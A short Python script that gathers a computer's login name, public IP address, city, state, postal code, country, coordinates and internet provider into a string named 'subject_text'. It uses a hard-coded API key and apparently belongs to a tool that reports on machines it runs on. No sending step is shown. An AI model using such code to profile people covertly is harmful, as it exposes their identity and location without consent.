from lib.ssw import GeoLocation
import os

locate = GeoLocation('409adf0f8bcf4b96bb3d5df44d235f61')

subject_text = f'''
    Name PC: {os.getlogin()} ||
    IP: {locate.ip_addr()} ||
    City: {locate.city()} ||
    State: {locate.region()} ||
    CEP: {locate.postal_code()} ||
    Country: {locate.country()} ||
    Lat: {locate.latitude()} ||
    Lon: {locate.longitude()} ||
    Provider: {locate.organization_name()}
'''